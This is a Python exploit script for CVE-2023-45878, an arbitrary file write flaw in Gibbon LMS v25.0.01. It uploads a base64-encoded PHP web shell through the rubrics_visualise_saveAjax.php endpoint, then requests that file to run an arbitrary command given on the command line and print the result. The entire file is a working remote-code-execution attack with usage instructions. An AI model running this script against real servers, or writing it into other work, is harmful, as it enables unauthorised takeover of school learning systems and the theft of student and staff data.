#!/python3
# Author: jrbH4CK
# Gibbon LMS v25.0.01 (before commit '226d83568cf3d447c4d86d4e5aba2c6e6289045d') Arbitrary File Write
# CVE-2023-45878
# Reference: https://herolab.usd.de/security-advisories/usd-2023-0025/

import requests, sys, base64, random, string

if len(sys.argv) != 3:
    print('Usage: python3 CVE-2023-45878.py url command')
    print('Example: python3 CVE-2023-45878 http://example.com whoami')
    sys.exit(1)

url = sys.argv[1]
command = sys.argv[2]
payload = f'''<?php echo system("{command}");?>'''
command = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
file_name = ''.join(random.choices(string.ascii_letters, k=4))
route = '/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php'
data = {'img': f'image/png;{file_name},{command}', 
        'path':f'{file_name}.php', 
        'gibbonPersonID':'0000000001'}
req = requests.post(url+route,data=data)
response = requests.get(url+f'/Gibbon-LMS/{file_name}.php')
print(file_name)

if len(response.text) != 0:
    print(response.text)
else: print("Someting went wrong! :(")
